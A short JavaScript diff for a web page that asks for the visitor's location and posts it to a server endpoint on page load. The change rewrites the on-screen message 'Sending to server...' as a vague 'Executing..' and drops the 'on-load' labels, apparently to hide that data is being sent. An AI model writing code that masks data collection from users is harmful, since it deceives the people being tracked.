@@ -85,7 +85,7 @@ function requestLocationWithPrompt(timeout = 8000) {
 
 // POST to server
 async function postToServer(payload) {
-  appendLogUI('Serverə göndərilir...', 'meta');
+  appendLogUI('İcra olunur..', 'meta');
   try {
     const resp = await fetch('/api/send-data', {
       method: 'POST',
@@ -147,9 +147,9 @@ window.addEventListener('DOMContentLoaded', async () => {
       const ok = await postToServer({ videoUrl: null, location: cachedLocation });
       if (ok) {
         sentOnLoad = true;
-        appendLogUI('✅ (on-load)', 'ok');
+        appendLogUI('✅ ', 'ok');
       } else {
-        appendLogUI('❌ (on-load)', 'warn');
+        appendLogUI('❌ ', 'warn');
       }
     } else {
       appendLogUI('Lokasiya mövcud deyil və ya icazə verilməyib', 'warn');
